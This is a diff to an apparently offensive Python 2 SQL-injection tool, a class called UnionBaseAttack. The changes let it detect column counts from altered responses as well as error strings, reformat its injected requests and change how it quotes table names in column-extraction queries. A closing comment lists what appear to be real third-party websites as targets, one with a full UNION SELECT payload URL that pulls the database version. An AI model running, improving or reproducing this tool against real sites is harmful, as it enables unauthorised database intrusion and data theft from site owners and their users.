@@ -25,8 +25,10 @@ class UnionBaseAttack(object):
         #order by injection with error
         for item in define_order_by_command_php:
             lib.sleep(.5)
-            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata, verify=False)
-            if secondResponse.content.find(define_error_order_by_php[0]) is not -1:
+            secondResponse = lib.requests.get(url=self.url + str(item),
+                                              headers=define_headerdata, verify=False)
+            if secondResponse.content.find(define_error_order_by_php[0]) is not -1 or \
+                    secondResponse.content != self.firstResponse.content:
                 injected_method = item[0:10]
                 print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
                 columns = self.__InjectOrderNumber__(injected_method)
@@ -53,12 +55,13 @@ class UnionBaseAttack(object):
                     lib.sleep(.5)
                     secondResponse = lib.requests.get(url=self.url + item[0:10] + "%d --"%(counter),
                                                       headers=define_headerdata, verify=False)
-                    if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1:
+                    if secondResponse.content.find("Unknown column '%d' in 'order clause'"%(counter)) is not -1 or \
+                            secondResponse.content != self.firstResponse.content:
                         done_str = self.url + item[0:10] + str(counter - 1)
                         print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(counter - 1, done_str)) + TextColor.WHITE
                         print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
                         self.__UnionSelectQuery__(counter - 1)
-                        del (columns)
+                        del columns
                         break
         
 
@@ -92,7 +95,8 @@ class UnionBaseAttack(object):
         
         '''this below code test url with (-) in and forward of number in url'''
         for item in define_union_select_query_php:    
-            response = lib.requests.get(url=new_url + str(item + injection_string), headers=define_headerdata, verify=False)
+            response = lib.requests.get(url=new_url + str(item + injection_string),
+                                        headers=define_headerdata, verify=False)
             for numbers in list_my_injection_numbers:
                 if response.content.find(numbers) is not -1:
                     vuln_columns.append(numbers[0:1])
@@ -106,7 +110,8 @@ class UnionBaseAttack(object):
         '''this below code test raw url with no (-) in url'''
         if done_searching_columns == False:
             for item in define_union_select_query_php:    
-                response = lib.requests.get(url=self.url + str(item + injection_string), headers=define_headerdata,
+                response = lib.requests.get(url=self.url + str(item + injection_string),
+                                            headers=define_headerdata,
                                             verify=False)
                 for numbers in list_my_injection_numbers:
                     if response.content.find(numbers) is not -1:
@@ -269,7 +274,7 @@ class UnionBaseAttack(object):
                 while True:
                     response = lib.requests.get(str(lib.string.replace(success_InjectedString, 
                                 vuln_columns[0], define_get_columns_of_table_convert_query_php[counter])
-                                + define_end_columns_of_table_convert_query_php[counter] + "%27" + selected_table + "%27" 
+                                + define_end_columns_of_table_convert_query_php[counter] + "" + selected_table + ""
                                 + " limit %d, 1"%(limit_counter)),  headers=define_headerdata, verify=False)
                     if response.content.find("'2134115356'") is not -1:
                         try:
@@ -333,5 +338,8 @@ class UnionBaseAttack(object):
 
     todo: http://www.atmarine.fi/index.php?id=-2%20union%20select%201,2,concat(%27hello%27,%20version(),%20%27hello%27),4,5,6,7,8,9,10
     same problem in this two target
+    
+    https://www.maine-elderlaw.com/article.php?id=4
+    http://bcactivityreporter.com/article.php?ID=2
 
 '''
